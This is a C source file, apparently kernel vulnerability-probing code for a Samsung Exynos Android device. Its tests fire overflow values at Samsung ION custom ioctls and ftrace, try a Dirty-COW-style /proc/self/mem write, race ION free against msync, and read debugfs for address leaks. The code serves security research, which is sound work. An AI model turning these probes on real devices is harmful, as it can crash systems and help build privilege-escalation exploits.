/*
 * samsung_deep_probe.c — Creative kernel attack surface probing
 *
 * Tests Samsung-specific and under-explored kernel paths:
 *   1. ION_IOC_CUSTOM with Samsung exynos custom commands
 *   2. Ftrace buffer_size_kb integer overflow
 *   3. /proc/self/mem write to code pages (Dirty COW variant)
 *   4. Samsung ION cache sync with extreme parameters
 *   5. Netlink route socket operations
 *   6. madvise MADV_DONTNEED + read race
 *   7. Samsung DECON/display driver probing via debugfs
 *   8. mremap to move stack/heap pages
 *
 * Build: .\qemu\build-arm.bat src\samsung_deep_probe.c samsung_deep_probe
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>

/* ION ioctls (ARM32 correct sizes) */
#define ION_IOC_ALLOC   0xC0144900  /* _IOWR('I', 0, 20) */
#define ION_IOC_FREE    0xC0044901  /* _IOWR('I', 1, 4) */
#define ION_IOC_SHARE   0xC0084904  /* _IOWR('I', 4, 8) */
#define ION_IOC_CUSTOM  0xC0084906  /* _IOWR('I', 6, 8) */

/* Samsung ION custom commands (from exynos source) */
#define ION_EXYNOS_CUSTOM_PHYS  0
#define ION_EXYNOS_CUSTOM_MSYNC 1

struct ion_custom_data {
    uint32_t cmd;
    uint32_t arg;  /* unsigned long on ARM32 = 4 bytes, pointer to data */
};

/* Samsung ION msync data */
struct ion_msync_data {
    uint32_t dir;   /* 0=bidirectional, 1=to_device, 2=from_device */
    int32_t  fd;
    uint32_t size;
    uint32_t offset;
};

/* Samsung ION phys data */
struct ion_phys_data {
    int32_t  fd;
    uint32_t phys;  /* output: physical address */
    uint32_t size;  /* output: size */
};

static int ion_alloc_fd(void) {
    int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (ion < 0) return -1;
    struct { uint32_t len, align, heap_id_mask, flags, handle; }
        alloc = {4096, 4096, 1, 0, 0};
    if (ioctl(ion, ION_IOC_ALLOC, &alloc) < 0 || alloc.handle == 0)
        { close(ion); return -1; }
    struct { uint32_t handle; int32_t fd; } share = { alloc.handle, -1 };
    if (ioctl(ion, ION_IOC_SHARE, &share) < 0)
        { close(ion); return -1; }
    close(ion);
    return share.fd;
}

/* ===== TEST 1: ION_IOC_CUSTOM commands ===== */

static void test_ion_custom(void) {
    printf("=== TEST 1: Samsung ION_IOC_CUSTOM commands ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);

        int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
        if (ion < 0) { printf("  can't open /dev/ion\n"); _exit(1); }

        int dma_fd = ion_alloc_fd();
        printf("  ION fd=%d, dma_buf_fd=%d\n", ion, dma_fd);

        /* Test PHYS command */
        struct ion_phys_data phys_data = { .fd = dma_fd, .phys = 0, .size = 0 };
        struct ion_custom_data custom = {
            .cmd = ION_EXYNOS_CUSTOM_PHYS,
            .arg = (uint32_t)(uintptr_t)&phys_data
        };
        int r = ioctl(ion, ION_IOC_CUSTOM, &custom);
        printf("  PHYS: ioctl=%d errno=%d phys=0x%08x size=%u\n",
               r, r < 0 ? errno : 0, phys_data.phys, phys_data.size);

        /* Test MSYNC command — normal */
        struct ion_msync_data msync_data = {
            .dir = 0, .fd = dma_fd, .size = 4096, .offset = 0
        };
        custom.cmd = ION_EXYNOS_CUSTOM_MSYNC;
        custom.arg = (uint32_t)(uintptr_t)&msync_data;
        r = ioctl(ion, ION_IOC_CUSTOM, &custom);
        printf("  MSYNC(normal): ioctl=%d errno=%d\n", r, r < 0 ? errno : 0);

        /* Test MSYNC with huge size (integer overflow?) */
        msync_data.size = 0xFFFFFFFF;
        msync_data.offset = 0;
        r = ioctl(ion, ION_IOC_CUSTOM, &custom);
        printf("  MSYNC(huge_size): ioctl=%d errno=%d\n", r, r < 0 ? errno : 0);

        /* Test MSYNC with huge offset */
        msync_data.size = 4096;
        msync_data.offset = 0xFFFFFFFF;
        r = ioctl(ion, ION_IOC_CUSTOM, &custom);
        printf("  MSYNC(huge_offset): ioctl=%d errno=%d\n", r, r < 0 ? errno : 0);

        /* Test MSYNC with size+offset overflow */
        msync_data.size = 0x80000000;
        msync_data.offset = 0x80000000;
        r = ioctl(ion, ION_IOC_CUSTOM, &custom);
        printf("  MSYNC(overflow): ioctl=%d errno=%d\n", r, r < 0 ? errno : 0);

        /* Test unknown custom commands */
        for (uint32_t cmd = 2; cmd <= 20; cmd++) {
            custom.cmd = cmd;
            custom.arg = 0;
            r = ioctl(ion, ION_IOC_CUSTOM, &custom);
            if (r == 0)
                printf("  cmd=%u: SUCCESS! ioctl=%d\n", cmd, r);
            else if (errno != ENOTTY && errno != EINVAL)
                printf("  cmd=%u: unexpected errno=%d\n", cmd, errno);
        }

        close(dma_fd);
        close(ion);
        _exit(0);
    }
    int status; waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  *** CRASH sig=%d ***\n", WTERMSIG(status));
    printf("\n");
}

/* ===== TEST 2: Ftrace buffer_size_kb extreme values ===== */

static void test_ftrace_overflow(void) {
    printf("=== TEST 2: Ftrace buffer_size_kb overflow ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);

        /* Check current value */
        int fd = open("/sys/kernel/debug/tracing/buffer_size_kb", O_RDWR);
        if (fd < 0) { printf("  can't open buffer_size_kb: %d\n", errno); _exit(1); }
        char buf[64];
        int n = read(fd, buf, sizeof(buf) - 1);
        if (n > 0) { buf[n] = 0; printf("  current: %s", buf); }

        /* Try extreme values */
        const char *tests[] = {
            "2147483647",  /* INT_MAX */
            "4294967295",  /* UINT_MAX */
            "0",
            "1",
            "-1",
            "99999999",
            NULL
        };
        for (int i = 0; tests[i]; i++) {
            lseek(fd, 0, SEEK_SET);
            int w = write(fd, tests[i], strlen(tests[i]));
            int e = errno;
            lseek(fd, 0, SEEK_SET);
            n = read(fd, buf, sizeof(buf) - 1);
            if (n > 0) buf[n] = 0; else buf[0] = 0;
            printf("  write '%s': w=%d errno=%d → now %s", tests[i], w, w < 0 ? e : 0, buf);
        }

        /* Restore */
        lseek(fd, 0, SEEK_SET);
        write(fd, "1408", 4);
        close(fd);
        _exit(0);
    }
    int status; waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  *** CRASH sig=%d ***\n", WTERMSIG(status));
    printf("\n");
}

/* ===== TEST 3: /proc/self/mem write to mmap'd file ===== */

static void test_proc_mem_write(void) {
    printf("=== TEST 3: /proc/self/mem write (Dirty COW variant) ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);

        /* mmap a file page read-only */
        int tmpfd = open("/data/local/tmp/test_readonly", O_RDWR | O_CREAT | O_TRUNC, 0644);
        if (tmpfd < 0) { _exit(99); }
        char orig[] = "AAAAAAAAAAAAAAAA";
        write(tmpfd, orig, 16);
        close(tmpfd);

        tmpfd = open("/data/local/tmp/test_readonly", O_RDONLY);
        void *map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, tmpfd, 0);
        printf("  mmap=%p\n", map);

        /* Open /proc/self/mem */
        int memfd = open("/proc/self/mem", O_RDWR);
        printf("  /proc/self/mem fd=%d errno=%d\n", memfd, memfd < 0 ? errno : 0);

        if (memfd >= 0 && map != MAP_FAILED) {
            /* Try to write through /proc/self/mem to the read-only mapping */
            char payload[] = "BBBBBBBBBBBBBBBB";
            lseek(memfd, (off_t)(uintptr_t)map, SEEK_SET);
            int w = write(memfd, payload, 16);
            printf("  write(mem, map): w=%d errno=%d\n", w, w < 0 ? errno : 0);

            /* Check if it changed */
            char check[17] = {0};
            memcpy(check, map, 16);
            printf("  map content: %.16s\n", check);

            /* Check file on disk */
            int checkfd = open("/data/local/tmp/test_readonly", O_RDONLY);
            if (checkfd >= 0) {
                read(checkfd, check, 16);
                printf("  file content: %.16s\n", check);
                close(checkfd);
            }
            close(memfd);
        }

        if (map != MAP_FAILED) munmap(map, 4096);
        close(tmpfd);
        unlink("/data/local/tmp/test_readonly");
        _exit(0);
    }
    int status; waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  *** CRASH sig=%d ***\n", WTERMSIG(status));
    printf("\n");
}

/* ===== TEST 4: madvise + read race ===== */

static volatile int g_stop = 0;

static void *madvise_thread(void *arg) {
    void *addr = arg;
    while (!g_stop) {
        madvise(addr, 4096, MADV_DONTNEED);
        usleep(1);
    }
    return NULL;
}

static void *read_thread(void *arg) {
    void *addr = arg;
    volatile char *p = (volatile char *)addr;
    int nonzero = 0;
    while (!g_stop) {
        /* Read from the page that madvise is dropping */
        char c = *p;
        if (c != 0 && c != 'X') nonzero++;
        *p = 'X';
        usleep(1);
    }
    printf("  read_thread: nonzero=%d\n", nonzero);
    return NULL;
}

static void test_madvise_race(void) {
    printf("=== TEST 4: madvise(DONTNEED) + read race ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);
        void *mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (mem == MAP_FAILED) _exit(99);
        *(char *)mem = 'X';

        g_stop = 0;
        pthread_t t1, t2;
        pthread_create(&t1, NULL, madvise_thread, mem);
        pthread_create(&t2, NULL, read_thread, mem);
        sleep(3);
        g_stop = 1;
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        printf("  no crash (race benign on anonymous mapping)\n");
        munmap(mem, 4096);
        _exit(0);
    }
    int status; waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  *** CRASH sig=%d ***\n", WTERMSIG(status));
    printf("\n");
}

/* ===== TEST 5: Netlink route operations ===== */

static void test_netlink_route(void) {
    printf("=== TEST 5: Netlink ROUTE operations ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);

        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        printf("  NL_ROUTE socket=%d errno=%d\n", sock, sock < 0 ? errno : 0);
        if (sock < 0) _exit(1);

        struct sockaddr_nl addr = { .nl_family = AF_NETLINK, .nl_groups = 0 };
        int r = bind(sock, (struct sockaddr *)&addr, sizeof(addr));
        printf("  bind=%d errno=%d\n", r, r < 0 ? errno : 0);

        /* RTM_GETLINK — get network interfaces */
        struct {
            struct nlmsghdr hdr;
            struct rtgenmsg gen;
        } req = {
            .hdr = { .nlmsg_len = sizeof(req), .nlmsg_type = RTM_GETLINK,
                     .nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP,
                     .nlmsg_seq = 1, .nlmsg_pid = getpid() },
            .gen = { .rtgen_family = AF_PACKET }
        };
        r = send(sock, &req, sizeof(req), 0);
        printf("  RTM_GETLINK send=%d errno=%d\n", r, r < 0 ? errno : 0);

        char buf[4096];
        r = recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
        printf("  recv=%d errno=%d\n", r, r < 0 ? errno : 0);

        /* Try RTM_NEWROUTE — add a route (may fail with EPERM) */
        struct {
            struct nlmsghdr hdr;
            struct rtmsg rtm;
        } route_req = {
            .hdr = { .nlmsg_len = sizeof(route_req), .nlmsg_type = RTM_NEWROUTE,
                     .nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
                     .nlmsg_seq = 2, .nlmsg_pid = getpid() },
            .rtm = { .rtm_family = AF_INET, .rtm_dst_len = 32,
                     .rtm_src_len = 0, .rtm_type = RTN_UNICAST }
        };
        r = send(sock, &route_req, sizeof(route_req), 0);
        printf("  RTM_NEWROUTE send=%d errno=%d\n", r, r < 0 ? errno : 0);
        r = recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
        printf("  response=%d errno=%d\n", r, r < 0 ? errno : 0);
        if (r > 0) {
            struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
            if (nlh->nlmsg_type == NLMSG_ERROR) {
                int *err = (int *)((char *)nlh + sizeof(struct nlmsghdr));
                printf("  NLMSG_ERROR: %d (%s)\n", *err, strerror(-*err));
            }
        }

        close(sock);
        _exit(0);
    }
    int status; waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  *** CRASH sig=%d ***\n", WTERMSIG(status));
    printf("\n");
}

/* ===== TEST 6: mremap on interesting pages ===== */

static void test_mremap_tricks(void) {
    printf("=== TEST 6: mremap tricks ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);

        /* Allocate a page, write data, mremap to new address */
        void *p1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p1 == MAP_FAILED) { printf("  mmap failed\n"); _exit(1); }
        *(uint32_t *)p1 = 0xDEADBEEF;

        /* mremap to grow (MREMAP_MAYMOVE) */
        void *p2 = mremap(p1, 4096, 8192, MREMAP_MAYMOVE);
        printf("  mremap grow: %p → %p (%s)\n", p1, p2,
               p2 == MAP_FAILED ? "FAILED" : "OK");
        if (p2 != MAP_FAILED && *(uint32_t *)p2 == 0xDEADBEEF)
            printf("  data preserved ✓\n");

        /* mremap to fixed address near TASK_SIZE boundary */
        void *p3 = mremap(p2 != MAP_FAILED ? p2 : p1, 4096, 4096,
                         MREMAP_MAYMOVE | MREMAP_FIXED,
                         (void *)0xBEF00000);
        printf("  mremap to 0xBEF00000: %p errno=%d\n", p3,
               p3 == MAP_FAILED ? errno : 0);

        /* Try to mremap ION buffer */
        int dma_fd = ion_alloc_fd();
        if (dma_fd >= 0) {
            void *ion_map = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                MAP_SHARED, dma_fd, 0);
            if (ion_map != MAP_FAILED) {
                printf("  ION mmap at %p\n", ion_map);
                void *ion_remap = mremap(ion_map, 4096, 8192, MREMAP_MAYMOVE);
                printf("  ION mremap: %p errno=%d\n", ion_remap,
                       ion_remap == MAP_FAILED ? errno : 0);
                munmap(ion_remap != MAP_FAILED ? ion_remap : ion_map,
                       ion_remap != MAP_FAILED ? 8192 : 4096);
            }
            close(dma_fd);
        }

        if (p3 != MAP_FAILED) munmap(p3, 4096);
        else if (p2 != MAP_FAILED) munmap(p2, 8192);
        _exit(0);
    }
    int status; waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  *** CRASH sig=%d ***\n", WTERMSIG(status));
    printf("\n");
}

/* ===== TEST 7: Samsung display driver debugfs ===== */

static void test_decon_debugfs(void) {
    printf("=== TEST 7: Samsung DECON display debugfs ===\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);

        /* List DECON debugfs entries */
        char buf[4096];
        FILE *fp;

        const char *paths[] = {
            "/sys/kernel/debug/decon",
            "/sys/kernel/debug/fimc-is",
            "/sys/kernel/debug/dma_buf",
            NULL
        };

        for (int i = 0; paths[i]; i++) {
            printf("  Checking %s...\n", paths[i]);
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "ls -la %s/ 2>&1 | head -10", paths[i]);
            fp = popen(cmd, "r");
            if (fp) {
                while (fgets(buf, sizeof(buf), fp))
                    printf("    %s", buf);
                pclose(fp);
            }
        }

        /* Try to read dma_buf info (may leak addresses) */
        int fd = open("/sys/kernel/debug/dma_buf/bufinfo", O_RDONLY);
        if (fd >= 0) {
            int n = read(fd, buf, sizeof(buf) - 1);
            if (n > 0) {
                buf[n] = 0;
                printf("  dma_buf/bufinfo:\n%s\n", buf);
            }
            close(fd);
        }

        _exit(0);
    }
    int status; waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  *** CRASH sig=%d ***\n", WTERMSIG(status));
    printf("\n");
}

/* ===== TEST 8: ION custom + concurrent operations race ===== */

static void test_ion_custom_race(void) {
    printf("=== TEST 8: ION_IOC_CUSTOM + FREE race ===\n");

    int anomalies = 0;
    for (int trial = 0; trial < 100; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);

            int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
            if (ion < 0) _exit(99);

            /* Alloc, get dma_buf fd */
            struct { uint32_t len, align, heap_id_mask, flags, handle; }
                alloc = {4096, 4096, 1, 0, 0};
            if (ioctl(ion, ION_IOC_ALLOC, &alloc) < 0) _exit(98);
            struct { uint32_t handle; int32_t fd; } share = { alloc.handle, -1 };
            if (ioctl(ion, ION_IOC_SHARE, &share) < 0) _exit(97);

            /* Race: CUSTOM MSYNC vs FREE */
            struct ion_msync_data msync_data = {
                .dir = 0, .fd = share.fd, .size = 4096, .offset = 0
            };
            struct ion_custom_data custom = {
                .cmd = ION_EXYNOS_CUSTOM_MSYNC,
                .arg = (uint32_t)(uintptr_t)&msync_data
            };

            for (int i = 0; i < 100; i++) {
                /* Re-alloc */
                alloc.handle = 0;
                if (ioctl(ion, ION_IOC_ALLOC, &alloc) < 0) continue;
                share.handle = alloc.handle;
                share.fd = -1;
                if (ioctl(ion, ION_IOC_SHARE, &share) < 0) {
                    ioctl(ion, ION_IOC_FREE, &alloc.handle);
                    continue;
                }
                msync_data.fd = share.fd;

                /* Concurrent: free handle + msync on the dma_buf fd */
                pthread_t t;
                g_stop = 0;
                uint32_t h = alloc.handle;

                /* In-line race: do free immediately, then msync */
                ioctl(ion, ION_IOC_FREE, &h);
                ioctl(ion, ION_IOC_CUSTOM, &custom);

                close(share.fd);
            }

            close(ion);
            _exit(0);
        }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            printf("  [%d] %s sig=%d\n", trial,
                   sig == SIGALRM ? "HANG" : "CRASH ***", sig);
            anomalies++;
        }
        if ((trial + 1) % 25 == 0)
            printf("  [%d/100] anomalies=%d\n", trial + 1, anomalies);
    }
    printf("  Result: %d anomalies / 100 trials\n\n", anomalies);
}

int main(int argc, char **argv) {
    printf("=== Samsung Deep Probe ===\n");
    printf("Kernel 3.10.9 | PID=%d UID=%d\n\n", getpid(), getuid());

    int test = -1;
    if (argc > 1) test = atoi(argv[1]);

    if (test < 0 || test == 1) test_ion_custom();
    if (test < 0 || test == 2) test_ftrace_overflow();
    if (test < 0 || test == 3) test_proc_mem_write();
    if (test < 0 || test == 4) test_madvise_race();
    if (test < 0 || test == 5) test_netlink_route();
    if (test < 0 || test == 6) test_mremap_tricks();
    if (test < 0 || test == 7) test_decon_debugfs();
    if (test < 0 || test == 8) test_ion_custom_race();

    printf("=== Done ===\n");
    return 0;
}
